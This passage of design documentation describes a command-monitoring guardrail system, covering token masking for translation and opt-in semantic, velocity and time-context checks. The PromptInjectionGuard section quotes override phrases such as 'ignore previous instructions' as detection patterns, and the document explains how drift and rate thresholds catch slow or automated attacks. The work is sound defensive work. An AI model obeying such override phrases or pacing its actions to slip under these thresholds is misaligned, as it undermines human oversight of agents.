**Step 6 — Technical token masking (`TechnicalTokenProtector.mask`):** The protector runs a compiled regex over the text. The pattern is an ordered alternation of alternatives built from `CommandNormalizer.knownExecutables()` plus URL patterns, file paths, timestamps, IP addresses, hostnames, dotted identifiers, reason codes (ALL_CAPS_WITH_UNDERSCORE), hyphenated identifiers, and numbers. Each matched technical token is replaced with a sentinel using Unicode mathematical brackets: `⟦IG0⟧`, `⟦IG1⟧`, `⟦IG2⟧`, ... The token list is saved in a `MaskedText` record alongside the masked string.

For example: `"restart nginx on /var/log"` → `"restart ⟦IG0⟧ on ⟦IG1⟧"` with tokens `["nginx", "/var/log"]`.

**Step 7 — Domain glossary masking:** A domain-specific glossary masks terms that should not be translated even if the token protector did not catch them.

**Step 8 — Provider call:** `callProvider(provider, maskedText, sourceLang, targetLang, config)` sends only the masked text (with technical tokens replaced by sentinels) to the configured translation provider. The call is bounded by a timeout via `Future.get(timeoutMs, MILLISECONDS)`. Three providers are available:
- `GeminiTranslationProvider` — uses the Gemini multimodal API, lazy client construction with a prioritized API key lookup (`intentguard.translation.api-key` first, then `intentguard.llm.api-key`).
- `BhashiniTranslationProvider` — posts to `https://dhruva-api.bhashini.gov.in/services/inference/pipeline`, the government NMT stack. Parses `pipelineResponse[0].output[0].target` from the response.
- `CloudTranslationProvider` — an alternate provider.

Any provider failure (timeout, non-2xx HTTP, malformed JSON) returns `Optional.empty()` and **never throws**.

**Step 9 — Restore (`TechnicalTokenProtector.restore`):** The translated masked text has its sentinels substituted back with the original tokens using literal `String.replace()` (not regex, so no escaping concerns). `⟦IG0⟧` → `nginx`, `⟦IG1⟧` → `/var/log`. Byte-for-byte fidelity is guaranteed by the literal replacement.

**Step 10 — Token integrity verification:** `tokenProtector.allTokensPreserved(restored, original)` iterates every original token and calls `restored.contains(token)`. If any token is missing (the provider dropped or modified a sentinel), the result is `TOKEN_INTEGRITY_FALLBACK` — the original untranslated text is returned instead. This is the safety net: if a provider mangles a sentinel, the engine continues working correctly with the English original rather than a corrupted translation.

**Step 11 — Cache and persist:** The valid translation is stored in `TranslationCache` and a `TranslationRecord` is persisted to MongoDB via `onTranslated()`.

### The Key Insight About Sentinel Design

The sentinels use `⟦IG0⟧` (Unicode U+27E6 / U+27E7) — Mathematical White Square Brackets. These characters do not appear in any natural language prose, any shell command, or any configuration value. A translation provider receiving `"service ⟦IG0⟧ ko restart karen"` (Hindi) has no reason to alter `⟦IG0⟧` and every reason to leave it in place. The `restore()` call is unconditional literal replacement — there is no parsing, no regex, no risk of the provider's output breaking the restoration logic.

### Outbound Translation (Alerts to Operators)

When the Control Tower pushes a live event (a decision, an alert, an anomaly), the `TranslatingLiveEventSink` looks up each subscriber's language preference and calls `translationService.translate(message, "en", preferredLang)`. Each operator sees alerts in their own language, while the engine's internal audit trail always stores the English version.

---

## 10. Stretch Guardrails — Semantic, Velocity, and Time-Context

These three guardrail modules are **opt-in** via feature flags. When the flag is off, the bean is not created and the core pipeline is entirely unaffected (they use `@ConditionalOnProperty`). When enabled, they each produce a self-contained result object that a caller folds into the `GuardrailContext` via floor-raising.

---

### Semantic Guardrails (`semantic/` package)
*Enabled by: `intentguard.guardrails.semantic.enabled=true`*

**`PromptInjectionGuard`** is stateless and deterministic. `evaluate(event, cfg)` builds a `commandContext` string = command text + sorted env-context values joined with spaces. It iterates the configured `promptInjectionPatterns` list in order. The first matching regex produces `PromptInjectionResult.match(patternId, promptInjectionFloor)` — this raises the Divergence Score floor. No match → `PromptInjectionResult.none()`. Example pattern: a command containing `"ignore previous instructions"` or `"forget your constraints"` embedded in what appears to be a file path argument.

**`SemanticLlmGuard`** is a thin LLM adapter. `evaluate(event, intentText)` calls `llmService.semanticInconsistency(event, intentText)` — the same Gemini call used by the scoring component. The difference is this guard can be invoked independently of the scoring pipeline, allowing semantic evaluation to be called from guardrail contexts where the full pipeline hasn't run yet. On timeout/error → `MalformedLlmResult.excluded()`.

**`IntentDriftTracker`** is the most architecturally interesting. It tracks **cumulative** divergence over an entire intent session, not per-event. The data structure is a `ConcurrentHashMap<sessionId, Double>`. Every time an event is scored:

```java
double contribution = eventDrift > 0.0 ? eventDrift : 0.0;  // clamp to non-negative
double cumulative = cumulativeBySession.merge(sessionId, contribution, Double::sum);
boolean alert = cumulative > cfg.driftThreshold();
return new IntentDriftResult(sessionId, cumulative, alert, alert, clock.millis());
```

The cumulative drift is **monotonically non-decreasing** — a single safe command never reduces the accumulated suspicion from prior commands. When cumulative drift crosses `cfg.driftThreshold()`, an alert is raised and recorded. This catches "slow boil" attacks where each individual command has a modest divergence score, but the pattern over many commands is clearly anomalous. `IntentDriftTracker.reset(sessionId)` is called when the session closes.

---

### Velocity Guardrails (`velocity/` package)
*Enabled by: `intentguard.guardrails.velocity.enabled=true`*

`VelocityGuard` tracks per-actor command arrival timestamps in a `ConcurrentHashMap<actorId, Deque<Long>>`. Each `evaluate(event, meanInterCommandMs)` call is wrapped in a per-actor `synchronized` block to make the evict-count-record cycle atomic.

**Rate-window check (Req 5.1):**
Arrivals older than `config.rateWindowMs()` are evicted from the deque. The current arrival is appended. If `windowCount > config.rateLimit()` → floor raised to `ASK`, trigger id `"velocity-rate-limit"`. This detects an operator (or agent) issuing commands far faster than humanly normal — a sign of automation or a script running out of control.

**Session anomaly threshold (Req 5.3):**
`windowCount > config.sessionAnomalyRateThreshold()` → `sessionAnomaly = true`, trigger id `"velocity-session-anomaly"`. This is a higher threshold than the rate limit; crossing it is a stronger signal that something is wrong with the session.

**Burst detection (Req 5.2):**
If the profile's mean inter-command interval is known (`meanInterCommandMs >= 0`) and the current interval deviates from the mean by more than `config.burstThresholdMs()`:
```java
if (Math.abs(interval - meanInterCommandMs) > config.burstThresholdMs()) {
    scoreFloor = OptionalDouble.of(config.burstAnomalyFloor());
    triggered.add(BURST_TRIGGER_ID);
}
```
This raises the Divergence Score floor for the current event. A command that arrives suspiciously fast (possible clipboard injection) or suspiciously slow (possible manual override after automated execution) is caught here.

---

### Time-Context Guardrails (`timecontext/` package)
*Enabled by: `intentguard.guardrails.time-context.enabled=true`*

`TimeContextGuard.evaluate(event, divergenceScore, config, source)` runs three independent rules:

**Rule 1 — Maintenance windows (Req 7.1):**
`clock.instant()` is converted to `LocalTime` in `config.zone()` (configurable timezone). If the current time is outside every approved `MaintenanceWindow` **and** the event's divergence score is at or above `config.maintenanceWindowRiskThreshold()` → floor raised to `ASK`, trigger id `"maintenance-window-off-hours"`. A risky command at 3am on a Sunday triggers this; a routine `ls` at 3am does not (score too low). Scheduled maintenance windows (e.g., 02:00–04:00) whitelist specific high-risk periods.

**Rule 2 — Context mismatch rules (Req 7.2):**
Each `ContextMismatchRule` in config has an `isMismatch(event)` method that compares command category against cwd/repo/env patterns. On a rule firing:
```java
scoreFloor = OptionalDouble.of(Math.max(existing, config.contextMismatchFloor()));
triggered.add(CONTEXT_MISMATCH_TRIGGER_PREFIX + rule.id());
```
Multiple rules can fire; each only raises the floor (never lowers it).

**Rule 3 — Source restriction (Req 7.3, 7.4):**
If `config.approvedSources()` is non-empty and the event's `envContext.get("source")` (or the explicit `source` parameter) is non-blank and not in the approved set → floor raised to `ASK`, `sourceRestricted = true`, trigger id `"source-restriction:<source>"`. Unknown/blank sources are never restricted (absence of source info is not a violation). A session originating from an unapproved IP range or VPN endpoint triggers this.

All three rules are evaluated independently and their floors are combined by taking the maximum. The `TimeContextContribution` record carries the combined floor, an optional score floor, the `sourceRestricted` flag, and the list of triggered guardrail IDs for the audit trail and explanation system.

---

### How Stretch Guardrails Connect to the Decision Chain

None of the three stretch guardrails modify `GuardrailDecisionEngine` directly. Each returns a self-contained result object. The caller (the interactive decision provider that assembles the `GuardrailContext`) folds each result in:
- `VelocityResult.floor()` → `CorrectiveAction.raiseTo(...)` in the floor model (Step 7)
- `VelocityResult.scoreFloor()` → fed into `BlastRadiusGuard`-equivalent score floor raising before the threshold map
- `TimeContextContribution.floor()` → same floor model
- `PromptInjectionResult.scoreFloor()` → raised before threshold map
- `IntentDriftTracker` alert → persisted as audit event, not directly a decision floor (drift is a session-level signal, not a per-command block)

This design means each guardrail is independently testable, independently deployable via feature flag, and cannot break the core pipeline when it malfunctions.
